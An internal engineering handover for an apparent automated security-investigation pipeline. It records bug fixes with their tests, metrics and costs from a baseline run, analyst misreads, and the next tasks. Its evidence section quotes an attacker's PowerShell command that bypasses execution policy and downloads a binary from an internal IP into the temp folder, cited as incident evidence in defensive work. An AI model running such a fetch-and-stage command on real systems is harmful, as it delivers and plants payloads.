# Handover: B20/B38–B41 fixed, new baseline `451334ad` (2026-10-11 night)

**Start here in a new session.** This replaces `docs/handover-2026-10-11-late.md`.

## Current state
- **Branch:** `broker-a818-fixes`, **PR #6** open against `main`.
  - Four commits from the late handover are still **not pushed**.
  - Everything from this session is **uncommitted** (list below).
- **Tests:** `uv run pytest -q engine/contracts engine/tests tests`: 1283 passed.
- **Run replays:** from a Claude shell, use `env -u AWS_PROFILE` (see the late handover). The server runs with `--reload`, so don't edit `.py` files during a live run.

## What was done this session (uncommitted)
| Id | Fix | Where | Test |
|---|---|---|---|
| B40 | `_first` treats `-` as empty, so a placeholder no longer hides the next key. It covers all 10 call sites. | `subagent_analysts/formatting.py:76` | `test_analyst_formatting.py` `test_dash_placeholder_does_not_mask_later_key` |
| B39 | A step's status follows its cumulative rows: `ok` once `rows_retrieved > 0`. | `broker.py` `evaluate_step` | `test_broker.py` `test_an_empty_redispatch_does_not_turn_a_step_with_rows_into_no_data` |
| B41 | `_fit` walks the row-cap ladder silently. `pack_evidence` logs, and `fitted_row_cap` doesn't. | `subagent_analysts/packing.py` | `test_analyst_prompts.py` `test_re_measuring_the_row_cap_does_not_repeat_the_warning` |
| B38 | A call whose rows are all `{EventCode, count…}` is filed as `discovery`, so it reaches no slice and completes no step. Mohammed chose discovery over a count line in `facts`. | `projection.py` `project_siem`, `_is_code_count` | `test_projection.py` `test_a_call_of_only_event_code_counts_is_discovery`; old `test_count_rows_by_event_code_are_not_moved` updated |
| B20 (Broker half) | Mohammed agreed the full design; details below this table. | `contracts/subtask.py`, `contracts/reasoning.py`, `broker.py`, `analyze._retrieval_summary` | `test_broker.py` `test_a_plan_of_only_unanswerable_questions_records_and_plans_nothing`; `test_reasoning.py` `test_unanswerable_questions_cross_as_code_worded_lines_even_over_budget` |
| B10 | The report's "crowds out summaries" item was stale; `ENCODED_LINE_CAP=8` already fixed it. | docs only | — |

**B20 details:**
- `FetchPlan.unanswerable: [Unanswerable{question, reason}]`. A plan may have no steps when it has unanswerable questions, and then it dispatches nothing.
- The Broker prompt has a new "QUESTIONS NO SOURCE CAN ANSWER" block. It names no unconfigured family (B7); "any product whose tool is not offered to you" covers CrowdStrike.
- The questions reach the Analyst as code-worded lines in `RetrievalSummary.unanswerable` and `AnalystPayload.unanswerable`. The size budget never trims them.
- The published schema was regenerated (`hypothesis-findings.v2.schema.json`, additions only).

**Other changes:**
- **B11:** stays deferred (Mohammed, 10-11). Count it on live runs first.
- **Issues report:** `docs/smartops-issues-report.md` is updated for all of the above.

## New baseline: `451334ad` (on all of the code above)
- **Shape:**
  - L2 ran 4 tasks (T1 OneDrive lineage, T2 svcupdate.dat present/hash/permissions, T3 processes talking to .211, T4 other hosts downloading it), then synthesis.
  - L3 ran 1 gap task (G1), then synthesis.
  - Verdict TRUE_POSITIVE 95 in both rounds. Scores were 90/30/20 after L2 and 95/20/15 after L3.
- **Time:** about 6.5 minutes from plan to final synthesis. The L2 Broker took about 4.5 minutes for 4 tasks (`2a71757f` took 6m39s).
- **Broker cost:** $1.33 in total. T1 $0.18, T2 $0.26, T3 $0.27, T4 $0.31, G1 $0.31.
- **What held live:**
  - **B20:** T2's plan recorded "is the file there now" and "its current ACLs" as `unanswerable` and searched only the history. The two lines reached the payload, and L3 synthesis wrote "despite unanswerable live-state questions".
  - **B40:** the facts now read `powershell.exe: SHA256 1C84C863…`. That hash is no longer pinned on svcupdate.dat.
  - **B39:** no step reads `no_data` beside rows.
  - **B41:** no repeated over-budget warning.
  - **B15:** every domain that had evidence came back with a narrative and observations (0 lost).
- **Steps:** every step completed except one, T2 `file_events_svcupdate`. It was dispatched twice, and both dispatches returned only processes, script blocks and discovery: siem never ran a file-event search. So `incomplete` is the correct outcome, and the gate refused `T2:endpoint` for it. G1's identical step did run a file search, got 0 rows, and was confirmed empty.
- **Windows:** T2 and T3 had their windows widened to the event ±1h (`dropped` in `investigation.jsonl`; P1/W9, known).

### What the evidence said, against what synthesis did with it
- **Holds:**
  - The download chain is in the rows as plain command lines: PowerShell `-ExecutionPolicy Bypass` runs `Invoke-WebRequest http://192.168.40.211/update/win-agent-2.4.1.bin` into `%TEMP%\svcupdate.dat`.
  - It ran as Mariam (parent OneDrive.exe) and as Administrator (parents `C:\Users\Administrator\Desktop\splunkd.exe` and `C:\Users\Public\splunkd.exe`).
  - T4 found no other host.
- **Doesn't hold (Analyst side, route to the Analyst owner):**
  - **"Encoded commands"** (both rounds): the facts say `enc#784267 … decodes to: $env:username`. The download is a plain `-C` command. The T2 endpoint narrative also wrote "cmdlines contain encoded commands downloading from …", a sub-analyst misread.
  - **"Consistent file hashing across all events confirms payload integrity"** (L3): the only hash in the facts is powershell.exe's own. B40 fixed the attribution, but synthesis still reads it as the payload's hash (T21/T24 class).
  - **"OneDrive.exe's anomalous parentless executions"** (L2): the rows have no parent recorded, and the narrative says "started without a parent process". That's missing data, not an anomaly.
  - **G1 repeated T2's question word for word.** L2 synthesis put "Is svcupdate.dat still present …? hash and permissions?" in `evidence_gaps` even though T2 had returned it as unanswerable. G1 then spent $0.31 to get the same two unanswerable lines. **New for the Analyst/webapp owner:** don't turn a question the Broker returned as unanswerable into a gap task.
- **Sub-analyst misreads (B11 evidence, count only):**
  - T3 says "4100 (script completed) and 4104 (script started)", and G1 says "4100 (start) and 4104 (end)". Both are wrong: 4104 is script-block logging, and 4100 is a PowerShell error/warning event.
- **Cosmetic:** the path shortening in the names facts cut mid-word: `AppData\…cal\Microsoft\OneDrive`. It's harmless, so I'm leaving it.

## Next, in order (Broker side)
1. **Commit this session's work** on `broker-a818-fixes`, in separate commits:
   - B40 + B39 + B41
   - B38
   - B20
   - docs
2. **B20 follow-up:** does a whole-task "unanswerable" ever happen live (steps empty, nothing dispatched)? On `451334ad` both cases were mixed tasks. Check on the next run whose alert carries a CMDB/EDR-style question.
3. **siem ignoring a step's category** (T2 `file_events_svcupdate`, 2 dispatches, no file search). This is a candidate new bug; frame it with Mohammed before coding. One option: a re-dispatch of a category-scoped step names the category that is still missing.
4. **Parallel fetch** (Mohammed decides; see the late handover, item 3).
5. **Siem query cache** (efficiency plan item 6).
6. **AR11:** the engine half only, after the layout is agreed.
7. **K4:** re-measure the holds when a tier preset changes.

## Decisions waiting on Mohammed
- Parallel fetch and its cap.
- The B15 safety net, and dropping the length re-ask (late handover, item 2).
- Whether siem ignoring a step's category gets registered as a bug, and its fix.
- AR11's target layout.
- T26 / W8 and P1, carried over.

## Routed, not ours
- **Analyst owner:**
  - Synthesis repeats "encoded commands" and treats powershell.exe's hash as the payload's (`451334ad`, both rounds).
  - A question that came back unanswerable becomes a gap task anyway (G1).
  - Carried over: G1–G3, T15, T21–T27, W10, T8/T10.
- **Webapp owner:**
  - `run_trace.compact_round` may drop `AnalystPayload.unanswerable` for earlier rounds.
  - Carried over: AR3, the webapp half of AR5, P2–P5, W1, W7.
- **smartops-worker (frontend):** W9.
